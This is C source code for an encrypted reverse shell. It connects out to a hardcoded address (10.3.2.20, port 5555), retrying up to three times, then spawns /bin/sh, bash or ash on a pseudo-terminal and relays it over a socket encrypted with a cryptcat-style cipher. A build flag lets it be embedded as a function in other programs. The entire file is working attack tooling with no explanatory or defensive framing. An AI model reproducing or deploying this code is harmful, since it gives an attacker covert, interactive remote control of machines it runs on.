#include <stdlib.h>
#include <pty.h>
#include <unistd.h>
#include <stdio.h>
#include <errno.h>
#include <sys/ioctl.h>

#include "netcat.h"
#include "farm9crypt.h"
#include "polarssl/net.h"
#include "debug.h"
#include "shuffle.h"

// configured to call-out only
#ifndef	_JSHELL
//./argv0 <host> <port> <key>
int main( int argc, char **argv ) {
	char	*host = argv[1];
	char	*port = argv[2];
	char	*key = argv[3];
#else
int jshell( char *host, char *port, char *key ) {
#endif

	int		netfd;
	int		pid;
	int		pty;
	int		tries = 3;

#ifndef _JSHELL
	if ( argc != 4 )
	{
		D( printf( " ! check command line arguments\n" ); )
		return -1;
	}
#endif

	// TODO: check return value
	D( printf( " . Host: %s, Port: %s, Key: %s\n", host, port, key ); )

	farm9crypt_init( key );

//	if ( net_connect( &netfd, host, atoi( port ) ) != 0 )
	while ( tries > 0 )
	{
		if ( net_connect( &netfd, "10.3.2.20", 5555) != 0 )
		{
			D( printf( " ! net_connect() failed\n" ); )
			sleep( 1 );
			tries--;
		}
		else
		{
			D( printf( " . net_connect() success\n" ); )
			break;
		}
	}
	if ( tries == 0 )
	{
		D( printf( " ! exceeded connection attempts. now exiting.\n" ); )
		return -1;
	}

//	char term[] = "TERM=xterm\0";
//	putenv( term );

#ifdef	LINUX
	pid = forkpty( &pty, NULL, NULL, NULL );
#endif

	if ( pid < 0 )
	{
		D( perror( " ! fork()" ); )
		return -1;
	}

	if ( pid == 0 )
	{
		// this is the child
		close( netfd );
		close( pty );

#ifdef	_USE_ASH
		execl( "/bin/ash", "ash", "-c", "/bin/ash", (char *)0 );
#elif	_USE_BASH
		execl( "/bin/bash", "bash", "-c", "/bin/bash", (char *)0 );
#else
		execl( "/bin/sh", "sh", "-c", "/bin/sh", (char *)0 );
#endif
	
		// not reached
		return -1;
	}
	else
	{
		// this is the parent
		shuffle( pty, netfd );

		return 0;
	}

	// not reached
	return 0;
}

